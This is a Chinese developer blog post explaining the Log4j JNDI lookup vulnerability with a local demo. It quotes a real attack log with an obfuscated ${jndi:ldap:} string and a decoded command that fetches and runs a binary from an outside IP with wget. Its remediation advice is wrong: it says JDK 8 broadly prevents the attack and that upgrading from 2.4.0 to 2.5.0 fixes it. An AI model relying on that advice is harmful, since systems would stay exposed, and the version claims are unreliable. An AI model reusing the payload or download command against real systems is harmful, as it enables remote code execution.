---
date: 2023-04-27 17:20:47

title: 【Log4J】关于最近比较火的log4j研究
---

![InterviewCoder](https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png)
## 【Log4J】关于最近比较火的log4j研究
<div id="content_views" class="htmledit_views"> 
 <p>最近log4j的安全漏洞搞得程序员人心慌慌，宣称为核弹级bug ，然后自己也找时间了解测试了一下。</p> 
 <p>Log4j是Apache的一个开源项目，通过使用Log4j，可以控制日志信息输送的目的地是控制台、文件等位置，是程序运行调试追溯问题发生位置的重要手段。</p> 
 <p><img alt="" height="439" src="https://img-blog.csdnimg.cn/5a64b8753efb4e28a7a8fe18cb3bec08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;如上，我们自定义username模仿前端请求数据，通过LOGGER.info打印登录的用户名，我们就可以在控制台查看打印的信息。这样我们就可以记录登录的用户。</p> 
 <p>前端传入什么参数，就会在控制台打印出相应参数。</p> 
 <p><img alt="" height="449" src="https://img-blog.csdnimg.cn/5259bd29abeb4d89befcf32d075e3acf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p></p> 
 <p>但当我们传入一些特定参数的时候，打印结果就与期待结果有点不一样了,我们用${java:os}登录打印的却是本机系统信息。</p> 
 <p><img alt="" height="425" src="https://img-blog.csdnimg.cn/b1537c7396ac4ff6b3910a5c7b70aa17.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;为什么会产生这种奇怪的现象呢？</p> 
 <p>是因为log4j提供了一个lookup的功能，对lookup功能不熟悉的也没有关系，你知道有这么个方法，可以把一些系统变量放到日志中就可以了。是不是有点sql注入的味道了。</p> 
 <p>&nbsp;如果只是打印一些简单的系统信息到还没有什么安全隐患。</p> 
 <p><strong>但离谱的是 log4j 还提供了关于 jndi 的占位符。</strong></p> 
 <p><strong>jndi </strong>可以理解为http 地址，log4j会自动加载通过 jndi 从远程服务器获取的 java 对象。就是说黑客用一个特殊标记的jndi字符串登录你的服务器，然后在你打印日志的时候，通过log4j识别远程调用黑客指定服务器的java对象，相当于在你的代码中植入了一段黑客的代码，他可以在这个java对象中写入任何逻辑，比如说植入一个挖矿程序啊，甚至删除你服务器上的任何文件，你说恐怖不 。</p> 
 <p></p> 
 <p></p> 
 <p>下面我写了一个示例代码：</p> 
 <p>我的service程序仍然是模拟简单的用户登录打印日志。但是登录用户确是一段包含特殊字符的字符串。</p> 
 <p><img alt="" height="265" src="https://img-blog.csdnimg.cn/f9f816e0632b4d97824b7df2c66a85c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;运行起来发现被植入了一段特殊的字符。</p> 
 <p><img alt="" height="374" src="https://img-blog.csdnimg.cn/21c480314e2b41728f8553e1af0068a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;这不是被人黑了吗。</p> 
 <p></p> 
 <p><strong>下面是我模拟的黑客自己搭建的攻击服务，可以选择性观看。</strong></p> 
 <p><img alt="" height="495" src="https://img-blog.csdnimg.cn/3573f5d9fc614c18a261ec5c36885981.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>127.0.0.1:80是我启动的一台nginx服务器，在其html文件下将编译好的EviObj的class文件放在了其下面。</p> 
 <p>EviObj类里面只有一个简答的打印代码。</p> 
 <p><img alt="" height="212" src="https://img-blog.csdnimg.cn/b1c2bafa599b4f3a9a191cc2b12d085e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="994"></p> 
 <p>&nbsp;然后就出现了之前的注入问题。</p> 
 <p>简单来说，就是log4j识别了字符串包中特殊的${jndi:rmi: }，log4j对其进行了远程调用，而黑客输入的地址正好是他部好侵入代码的地址，这样就在我们的代码中植入了黑客的代码。</p> 
 <p></p> 
 <p><strong>关于如何避免，我当然要看一下我们公司的程序会不会被攻击呀。</strong></p> 
 <p>如果你使用了 Java 8 或以上版本，基本对你没有什么危害。因为在 Java 8 中添加了一个新的属性 com.sun.jndi.rmi.object.trustURLCodebase，这是一个 boolean 类型。默认值是 false。</p> 
 <p>其实我刚才的代码也是隐藏了一部分，我把这个属性打开了才实验成功的。</p> 
 <p><img alt="" height="450" src="https://img-blog.csdnimg.cn/b272fe90a5e3426c904df05f236cab5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;而我们用的就是jdk8，所以第一个条件我们就规避成功避免了注入的条件。</p> 
 <p>其次log4j的版本是log4j 2.x&nbsp; -- log4j 2.4.0之间，如果处于这个版本区间需要升级到2.5.0版本方可。</p> 
 <p>而我们公司使用的版本是1.7.25版本 。</p> 
 <p><strong>然后最近我发现我们华为云上的一个项目确实被攻击了o(╥﹏╥)o，应该没有成功。</strong></p> 
 <p><strong>日志内容如下：</strong></p> 
 <p><img alt="" height="223" src="https://img-blog.csdnimg.cn/25e862aa81664787aaac24fa1a92e494.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1200"></p> 
 <p>&nbsp;第一段</p> 
 <p>{${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}</p> 
 <p>${env:NaN:-j} 等于 j&nbsp;</p> 
 <p>${env:NaN:-:} 等于：</p> 
 <p>${env:NaN:-l} 等于 l</p> 
 <p>那解析完不就是${jndi:ldap: xxxx}，靠真是jndi注入</p> 
 <p>然后再看bease 64部分解析结果如下：</p> 
 <p><img alt="" height="402" src="https://img-blog.csdnimg.cn/dc6f2c7e99b44e7f856ea81f690f4797.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZG9uZ3hpZXhpYW9hZG91,size_20,color_FFFFFF,t_70,g_se,x_16" width="1175"></p> 
 <p>&nbsp;wget http://209.141.46.114/reader : 网站下载reader文件</p> 
 <p>chmod 777 reader ： 修改reader权限为 777</p> 
 <p>./reader runner ：运行reader文件</p> 
 <p>真是太阴险了，谁知道这reader是什么病毒啊 [○･｀Д´･ ○]</p> 
 <p>我还真去下载了一下这个reader，但现在下来发现是编译后文件又用upx加壳的文件，解壳后又要反编译，我没有反编译出来也就只能到此为止了。</p> 
 <p></p> 
</div>
## 关于我

Brath是一个热爱技术的Java程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！

![InterviewCoder](https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png)

非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！